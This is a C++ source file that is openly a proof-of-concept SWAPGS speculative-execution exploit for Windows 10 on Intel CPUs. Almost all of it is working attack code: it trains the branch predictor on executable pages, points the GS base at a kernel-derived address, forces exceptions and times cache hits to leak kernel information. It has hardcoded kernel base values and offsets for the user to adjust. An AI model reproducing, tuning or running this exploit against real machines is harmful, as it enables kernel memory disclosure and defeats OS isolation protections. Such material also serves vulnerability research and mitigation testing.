#include <iostream>
#include <Windows.h>
#include <intrin.h>
#include "Native.h"

/*
* OS: WIN10 1809
* INTEL i5-7400, i5-6600, i5-4950, i7-4790 attacked; AMD Ryzen 1500 not affected; Zhaoxin cpu not affected
*/

uint64_t K = 0xfffff8041c21d000; // kernel base address, please conform your OS kernel base address
uint64_t V = 0x0000000300905a4d; // kernel base addrress value 


#define BP_TRAIN_PAGES 1024*16  // i5-7400 1024*16
#define CACHE_FLUSH_PAGES 1024*16
#define USER_PAGES 1

typedef void(*bp_train_fun)(unsigned char*);
unsigned char bp_code[] = {0xf6,0x01,0x01,0x75,0x03,0x4c,0x8b,0x11,0x48,0x8b,0x09,0xc3};
LPVOID user_leak_addr = NULL;
LPVOID bp_train_addr = NULL;
LPVOID cache_flush_addr = NULL;

unsigned char bp_flag[4096] = { 0 };
unsigned char bp_value[4096] = { 0 };
bp_train_fun trainfun;
uint64_t timeclk = 0;

uint64_t var_offset = 0x840;  // please conform var offset
uint64_t branch_offset = 0xcee; //  please conform target branch offset

void MyMemBarrier()
{
	//_mm_mfence();
	_mm_lfence();
	//_mm_sfence();
}
unsigned long long MyReadtscp(void* addr)
{
	unsigned int junk;
	unsigned long long time1, time2;
	
	//MyMemBarrier();
	//_mm_clflush((void*)&junk);
	//MyMemBarrier();
	time1 = __rdtscp(&junk);
	junk = *(unsigned char*)addr;
	time2 = __rdtscp(&junk);
	_mm_clflush((void*)addr);
	MyMemBarrier();
	return (time2 - time1);
}

unsigned long long MyReadtscp64(void* addr)
{
	unsigned int junk;
	unsigned long long time1, time2;

	//MyMemBarrier();
	//_mm_clflush((void*)&junk);
	//MyMemBarrier();
	time1 = __rdtscp(&junk);
	junk = *(uint64_t*)addr;
	time2 = __rdtscp(&junk);
	_mm_clflush((void*)addr);
	MyMemBarrier();
	return (time2 - time1);
}

void MyClflush(void* start, uint64_t length)
{
	uint64_t pstart = (uint64_t)start;
	for (uint64_t kk = pstart; kk < length; kk++) {
		_mm_clflush((void*)(kk + length));
		MyMemBarrier();
	}

}



unsigned long long MyFilterException(unsigned long long exceptioncode)
{
	timeclk = MyReadtscp64((void*)(V + 0x220));
	
	if (timeclk <= 100 ) {
		fprintf(stderr, "swapgs measure : [V+0x220] is  0x%p  hit time is %d clks\n", V + 0x220, timeclk); //user_leak_addr 0x220
		return EXCEPTION_EXECUTE_HANDLER;
	}
	
	for (uint64_t kk = 0; kk < (CACHE_FLUSH_PAGES - 1); kk++)
	{
		_mm_lfence();
		*(unsigned char*)((unsigned char*)cache_flush_addr + kk*4096 + 0x840) = 0x55;
		_mm_lfence();
	}
	
	//_mm_lfence();
	bp_flag[0] = 0;
	//_mm_clflush((void*)&bp_flag[0]);
	//_mm_lfence();
	for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
		trainfun = (bp_train_fun)((unsigned char*)bp_train_addr + branch_offset - 0x3 + kk * 4096);
		//_mm_clflush((void*)&bp_flag[0]);
		//_mm_lfence();
		trainfun(&bp_flag[0]);
	}
	
	//return EXCEPTION_EXECUTE_HANDLER;
	return EXCEPTION_CONTINUE_EXECUTION;
	//return EXCEPTION_CONTINUE_SEARCH;
	//EXCEPTION_CONTINUE_SEARCH 继续向下寻找异常处理程序
	//EXCEPTION_CONTINUE_EXECUTION 异常已处理，继续执行发生异常处的指令
	//EXCEPTION_EXECUTE_HANDLER 异常已处理，跳转到__exception{}代码块中执行
}

int main()
{

	fprintf(stderr,"swapgs speculative attacks\n");
	fprintf(stderr, "exploit gadget:\n test byte ptr[nt!KiKvaShadow],1 \n jne skip_swapgs[4]\n swags \n");
	fprintf(stderr, " mov r10, qword ptr gs:[188h]\n mov rcx, qword ptr gs:[188h]\n mov rcx, qword ptr[rcx+220h]\n\n");
	fprintf(stderr, "kernel base addr K is 0x%p\n", K);
	fprintf(stderr, "kernel base addr value V is 0x%llx\n", V);
	user_leak_addr = VirtualAlloc((LPVOID)V, 4096 * USER_PAGES, MEM_RESERVE|MEM_TOP_DOWN|MEM_COMMIT, PAGE_READWRITE);

	if (NULL == user_leak_addr) {
		fprintf(stderr,"VirtualAlloc is failed\n");
		return 0;
	}
	for (int kk = 0; kk < 4096 * USER_PAGES; kk++) {
		_mm_clflush((void*)((unsigned char*)user_leak_addr + kk));
		MyMemBarrier();
	}
	
	fprintf(stderr, "user mapped addr is 0x%p\n", user_leak_addr);
	uint64_t cache_test = 0x0;	
	_mm_clflush((void*)&cache_test);
	MyMemBarrier();
	cache_test = 0x400;
	fprintf(stderr, "if cache hit takes time %d clks\n", MyReadtscp64((void*)&cache_test));
	MyMemBarrier();
	_mm_clflush((void*)&cache_test);
	MyMemBarrier();
	fprintf(stderr, "if cache miss takes time %d clks\n", MyReadtscp64((void*)&cache_test));

	// bp training not taken 

	_mm_clflush((void*)&bp_flag[0]);
	_mm_clflush((void*)&bp_value[0]);


	trainfun = __native_train;
	trainfun(&bp_flag[0]);
	_mm_clflush((void*)&bp_flag[0]);
	MyMemBarrier();

	bp_train_addr = VirtualAlloc(NULL, 4096 * BP_TRAIN_PAGES, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == bp_train_addr) {
		fprintf(stderr, "bp_train_addr fail\n");
		return 0;
	}
	for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
		memcpy((unsigned char*)bp_train_addr + branch_offset - 0x3 + kk * 4096, bp_code, 12);
	}

	bp_flag[0] = 0;
	MyMemBarrier();
	for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
		trainfun = (bp_train_fun)((unsigned char*)bp_train_addr + branch_offset -0x3 + kk * 4096);
		_mm_clflush((void*)&bp_flag[0]);
		MyMemBarrier();
		trainfun(&bp_flag[0]);
	}

	bp_flag[0] = 1;
	_mm_clflush((void*)&bp_flag[0]);
	MyMemBarrier();
	_mm_clflush((void*)&bp_value[0]);
	MyMemBarrier();
	fprintf(stderr, "bp train before measure time is %d clks\n", MyReadtscp(&bp_value[0]));
	__native_train_is_done(&bp_flag[0], &bp_value[0]);
	fprintf(stderr, "bp train after measure time is %d clks\n", MyReadtscp(&bp_value[0]));

	bp_flag[0] = 0;
	_mm_clflush((void*)&bp_flag[0]);
	MyMemBarrier();
	for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
		trainfun = (bp_train_fun)((unsigned char*)bp_train_addr + branch_offset - 0x3 + kk * 4096);
		_mm_clflush((void*)&bp_flag[0]);
		MyMemBarrier();
		trainfun(&bp_flag[0]);
	}
	//cache flush CACHE_FLUSH_PAGES
    cache_flush_addr = VirtualAlloc(NULL, 4096 * CACHE_FLUSH_PAGES, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == cache_flush_addr) {
		fprintf(stderr, "cache_flush_addr fail\n");
		return 0;
	}
	
	LARGE_INTEGER timestart;
	LARGE_INTEGER timeend;
	LARGE_INTEGER frequency;
	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&timestart);
	double quadpart = (double)frequency.QuadPart; //frequency


	fprintf(stderr, "write new gs base is K-0x188 is 0x%p\n", K - 0x188);
	__native__set_gs_base((LPVOID)(K - 0x188));
	fprintf(stderr, "read new gs base is 0x%p\n", __native__read_gs_base());

	for (;;) {
		
		//first
		
		for (uint64_t kk = 0; kk < (CACHE_FLUSH_PAGES - 1); kk++)
		{

			*(unsigned char*)((unsigned char*)cache_flush_addr + kk*4096 + var_offset) = 0x55;
			//MyMemBarrier();

		}
		
		//_mm_lfence();
		bp_flag[0] = 0;
		//_mm_clflush((void*)&bp_flag[0]);
		//_mm_lfence();
		for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
			trainfun = (bp_train_fun)((unsigned char*)bp_train_addr + branch_offset - 0x3 + kk * 4096);
			//_mm_clflush((void*)&bp_flag[0]);
			//_mm_lfence();
			trainfun(&bp_flag[0]);
		}
		
		//fprintf(stderr, "read new gs base is 0x%p\n", __native__read_gs_base());

		try {
			__native__set_gs_base((LPVOID)(K - 0x188));
			__ud2();
		}
		catch (...) {
		
			__native__set_gs_base((LPVOID)(K - 0x188));
		}
		for (uint64_t kk = 0; kk < (CACHE_FLUSH_PAGES - 1); kk++)
		{
		
			*(unsigned char*)((unsigned char*)cache_flush_addr + kk * 4096 + var_offset) = 0x55;
			//MyMemBarrier();
		}

		//_mm_lfence();
		bp_flag[0] = 0;
		//_mm_clflush((void*)&bp_flag[0]);
		//_mm_lfence();
		for (int kk = 0; kk < BP_TRAIN_PAGES; kk++) {
			trainfun = (bp_train_fun)((unsigned char*)bp_train_addr + branch_offset - 0x3 + kk * 4096);
			//_mm_clflush((void*)&bp_flag[0]);
			//_mm_lfence();
			trainfun(&bp_flag[0]);
		}
		try {
			__native__set_gs_base((LPVOID)(K - 0x188));
			__ud2();
		}
		catch (...) {
			__native__set_gs_base((LPVOID)(K - 0x188));
			timeclk = MyReadtscp64((void*)(V + 0x220));
			if (timeclk < 160) {
				fprintf(stderr, "swapgs measure : [V+0x220] is  0x%p  hit time is %d clks\n", V + 0x220, timeclk); //user_leak_addr 0x220
				break;
			}
			
		}
		
		/*
		__try{
			__native__set_gs_base((LPVOID)(K - 0x188));
			__ud2();
		}
		__except (MyFilterException(GetExceptionCode())) {
			system("pause");
		}
		*/

	}

	QueryPerformanceCounter(&timeend);
	double elapsed = (timeend.QuadPart - timestart.QuadPart) / quadpart; 
	printf("attack take time is %f s\n", elapsed);
	//_mm_clflush((void*)user_leak_addr);
	//fprintf(stderr, "swapgs measure time is %d\n", MyReadtscp64((void*)V)); //user_leak_addr
	system("pause");
	return 0;
}